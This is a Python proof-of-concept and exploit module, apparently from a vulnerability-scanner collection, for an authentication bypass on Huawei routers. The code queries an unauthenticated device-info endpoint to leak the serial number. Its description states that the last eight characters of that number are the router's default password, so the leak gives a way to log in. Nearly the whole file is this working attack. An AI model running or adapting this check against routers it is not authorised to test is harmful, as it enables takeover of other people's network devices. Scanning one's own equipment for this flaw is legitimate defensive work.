import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Huawei Router Authentication Bypass''',
        "description": '''The default password of this router is the last 8 characters of the device's serial number which exist in the back of the device.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/48310"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["huawei", "auth-bypass", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/system/deviceinfo"""
        method = "GET"
        data = """"""
        headers = {'Accept': 'application/json, text/javascript, */*; q=0.01'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""DeviceName""" in resp0.text and """SerialNumber""" in resp0.text and """HardwareVersion""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url